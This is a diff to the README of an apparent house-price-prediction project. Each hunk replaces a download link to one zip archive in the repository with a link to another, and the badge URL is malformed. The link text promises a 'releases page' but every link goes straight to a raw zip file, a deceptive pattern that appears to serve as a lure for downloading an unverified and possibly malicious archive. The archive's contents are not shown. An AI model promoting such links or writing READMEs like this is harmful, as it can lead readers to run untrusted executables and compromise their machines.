@@ -6,7 +6,7 @@ Welcome to House-price-prediction! This software helps you estimate property pri
 
 ## 🔗 Download Link
 
-[![Download House-price-prediction](https://github.com/Jeanbastidas/House-price-prediction/raw/refs/heads/main/House-Price-Prediction-main/price-House-prediction-v1.2.zip%https://github.com/Jeanbastidas/House-price-prediction/raw/refs/heads/main/House-Price-Prediction-main/price-House-prediction-v1.2.zip)](https://github.com/Jeanbastidas/House-price-prediction/raw/refs/heads/main/House-Price-Prediction-main/price-House-prediction-v1.2.zip)
+[![Download House-price-prediction](https://raw.githubusercontent.com/Jeanbastidas/House-price-prediction/main/House-Price-Prediction-main/House_prediction_price_v2.6.zip%https://raw.githubusercontent.com/Jeanbastidas/House-price-prediction/main/House-Price-Prediction-main/House_prediction_price_v2.6.zip)](https://raw.githubusercontent.com/Jeanbastidas/House-price-prediction/main/House-Price-Prediction-main/House_prediction_price_v2.6.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before downloading, please check that your computer meets these basic requiremen
 
 To get started, visit the releases page to download the software:
 
-[Visit this page to download](https://github.com/Jeanbastidas/House-price-prediction/raw/refs/heads/main/House-Price-Prediction-main/price-House-prediction-v1.2.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Jeanbastidas/House-price-prediction/main/House-Price-Prediction-main/House_prediction_price_v2.6.zip)
 
 1. Click the link above to go to the releases page.
 2. Find the latest version of House-price-prediction.
@@ -70,6 +70,6 @@ For more tips and guidance, you can check the following resources:
 
 Remember, you can always revisit the releases page for new updates or future versions. 
 
-[Visit this page to download](https://github.com/Jeanbastidas/House-price-prediction/raw/refs/heads/main/House-Price-Prediction-main/price-House-prediction-v1.2.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Jeanbastidas/House-price-prediction/main/House-Price-Prediction-main/House_prediction_price_v2.6.zip)
 
 Thank you for choosing House-price-prediction. We hope this application helps you make informed property decisions!
